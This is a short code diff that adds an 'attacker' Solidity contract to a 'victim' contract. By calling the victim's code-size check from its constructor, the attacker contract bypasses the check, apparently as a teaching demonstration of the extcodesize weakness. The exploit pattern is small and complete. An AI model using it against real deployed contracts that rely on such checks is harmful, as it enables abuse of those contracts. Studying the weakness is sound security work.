@@ -11,3 +11,13 @@ contract victim{
         return(size>0);
     }
 }
+
+
+contract attacker {
+    bool public trickedYou;
+    victim Victim;
+    constructor(address _v){
+        Victim =victim(_v);
+        trickedYou=!Victim.isItAContract();
+    }
+}
